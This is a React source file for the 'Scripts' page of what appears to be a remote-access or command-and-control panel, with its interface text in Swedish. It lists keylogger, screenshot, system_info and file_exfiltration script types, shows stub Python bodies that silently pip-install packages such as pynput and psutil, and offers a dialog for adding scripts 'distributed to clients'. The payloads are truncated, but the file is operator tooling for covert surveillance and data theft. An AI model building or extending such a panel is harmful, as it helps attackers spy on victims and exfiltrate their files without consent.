
import React, { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Table, TableHeader, TableRow, TableHead, TableBody, TableCell } from "@/components/ui/table";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useQuery } from "@tanstack/react-query";
import { CodePreview } from "@/components/scripts/CodePreview";

// Mocked data for development
const SCRIPT_TYPES = [
  "standard",
  "keylogger",
  "screenshot",
  "system_info",
  "file_exfiltration"
];

const MOCK_SCRIPTS = {
  standard: `import sys
import subprocess
import importlib.util
import hashlib
import threading
import socket
import uuid
import re
import json

# Function to install package
def install_package(package):
    if importlib.util.find_spec(package) is None:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install required packages
install_package("requests")
install_package("pyperclip")

# More code follows...`,
  keylogger: `import sys
import subprocess
import importlib.util
import hashlib
import threading
import socket
import re

# Function to install package
def install_package(package):
    if importlib.util.find_spec(package) is None:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install required packages
install_package("requests")
install_package("pynput")

# More code follows...`,
  screenshot: `import sys
import subprocess
import importlib.util
import hashlib
import threading
import socket
import re

# Function to install package
def install_package(package):
    if importlib.util.find_spec(package) is None:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install required packages
install_package("requests")
install_package("pillow")

# More code follows...`,
  system_info: `import sys
import subprocess
import importlib.util
import hashlib
import threading
import socket
import re

# Function to install package
def install_package(package):
    if importlib.util.find_spec(package) is None:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install required packages
install_package("requests")
install_package("psutil")
install_package("platform")

# More code follows...`,
  file_exfiltration: `import sys
import subprocess
import importlib.util
import hashlib
import threading
import socket
import re

# Function to install package
def install_package(package):
    if importlib.util.find_spec(package) is None:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install required packages
install_package("requests")

# More code follows...`
};

const fetchScripts = async () => {
  // In a real implementation, fetch from server
  // return await fetch('/api/scripts').then(res => res.json());
  return MOCK_SCRIPTS;
};

export default function Scripts() {
  const [activeScript, setActiveScript] = useState(SCRIPT_TYPES[0]);
  const [isAddScriptOpen, setIsAddScriptOpen] = useState(false);
  const [newScriptName, setNewScriptName] = useState("");
  const [newScriptContent, setNewScriptContent] = useState("");

  const { data: scripts, isLoading, error } = useQuery({
    queryKey: ['scripts'],
    queryFn: fetchScripts,
    placeholderData: MOCK_SCRIPTS
  });

  const handleAddScript = () => {
    // In a real implementation, send to server
    console.log("Adding new script:", newScriptName, newScriptContent);
    setIsAddScriptOpen(false);
    setNewScriptName("");
    setNewScriptContent("");
  };

  if (error) {
    return <div className="p-6">Error loading scripts: {error.message}</div>;
  }

  return (
    <div className="h-full flex-1 flex-col space-y-8 p-8 md:flex">
      <div className="flex items-center justify-between">
        <h2 className="text-3xl font-bold tracking-tight">Scripts</h2>
        <Button onClick={() => setIsAddScriptOpen(true)}>Lägg till script</Button>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <Card className="md:col-span-1">
          <CardHeader>
            <CardTitle>Tillgängliga Scripts</CardTitle>
            <CardDescription>
              Välj ett script för att se dess kod
            </CardDescription>
          </CardHeader>
          <CardContent>
            <ScrollArea className="h-[500px]">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Scriptnamn</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {isLoading ? (
                    <TableRow>
                      <TableCell>Laddar scripts...</TableCell>
                    </TableRow>
                  ) : (
                    Object.keys(scripts).map((scriptType) => (
                      <TableRow 
                        key={scriptType}
                        className={activeScript === scriptType ? "bg-secondary" : ""}
                        onClick={() => setActiveScript(scriptType)}
                        style={{ cursor: 'pointer' }}
                      >
                        <TableCell className="font-medium">{scriptType}</TableCell>
                      </TableRow>
                    ))
                  )}
                </TableBody>
              </Table>
            </ScrollArea>
          </CardContent>
        </Card>

        <Card className="md:col-span-2">
          <CardHeader>
            <CardTitle>Script Kod: {activeScript}</CardTitle>
            <CardDescription>
              Innehåll i det valda scriptet
            </CardDescription>
          </CardHeader>
          <CardContent>
            <ScrollArea className="h-[500px] w-full">
              {isLoading ? (
                <div>Laddar kod...</div>
              ) : (
                <CodePreview code={scripts[activeScript] || ""} />
              )}
            </ScrollArea>
          </CardContent>
        </Card>
      </div>

      <Dialog open={isAddScriptOpen} onOpenChange={setIsAddScriptOpen}>
        <DialogContent className="max-w-3xl">
          <DialogHeader>
            <DialogTitle>Lägg till nytt script</DialogTitle>
            <DialogDescription>
              Skapa ett nytt script som kan distribueras till klienter
            </DialogDescription>
          </DialogHeader>
          <div className="grid gap-4 py-4">
            <div className="grid grid-cols-4 items-center gap-4">
              <Label htmlFor="scriptName" className="text-right">Scriptnamn</Label>
              <Input 
                id="scriptName" 
                value={newScriptName} 
                onChange={(e) => setNewScriptName(e.target.value)} 
                className="col-span-3"
                placeholder="t.ex. custom_logger"
              />
            </div>
            <div className="grid grid-cols-4 items-center gap-4">
              <Label htmlFor="scriptContent" className="text-right">Script Kod</Label>
              <Textarea 
                id="scriptContent" 
                value={newScriptContent} 
                onChange={(e) => setNewScriptContent(e.target.value)} 
                className="col-span-3 min-h-[300px] font-mono"
                placeholder="# Python kod här..."
              />
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setIsAddScriptOpen(false)}>Avbryt</Button>
            <Button onClick={handleAddScript}>Spara script</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
